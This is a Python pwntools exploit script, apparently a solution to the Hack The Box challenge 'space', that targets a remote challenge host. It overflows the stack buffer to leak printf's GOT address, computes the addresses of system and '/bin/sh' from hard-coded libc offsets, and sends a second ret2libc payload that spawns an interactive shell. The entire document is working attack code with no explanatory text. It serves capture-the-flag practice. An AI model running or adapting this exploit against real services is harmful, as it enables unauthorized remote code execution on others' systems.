from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))




#p = process('./space')
p = remote('docker.hackthebox.eu',31465)
printf_got = p32(0x0804b2d4)
printf_plt = p32(0x08049040)
read_plt = p32(0x08049030)
main_again = p32(0x080491cf)

padd = 'A' * 18

payload =  ''
payload += padd
payload += printf_plt
payload += main_again
payload += printf_got

#raw_input('hello')
p.recv(2)
p.sendline(payload)

printf_leak = uu32(p.recv(4))
system = printf_leak -0xe9c0
bin_sh= printf_leak + 0x13b572

print hex(printf_leak), hex(system), hex(bin_sh)
p.recvuntil(" ")
padd = 'B' * 18
padd2 = p32(0x0)
payload2 = ''
payload2 += padd
payload2 += p32(system)
payload2 += "AAAA"
payload2 += p32(bin_sh)
p.sendline(payload2)
p.interactive()
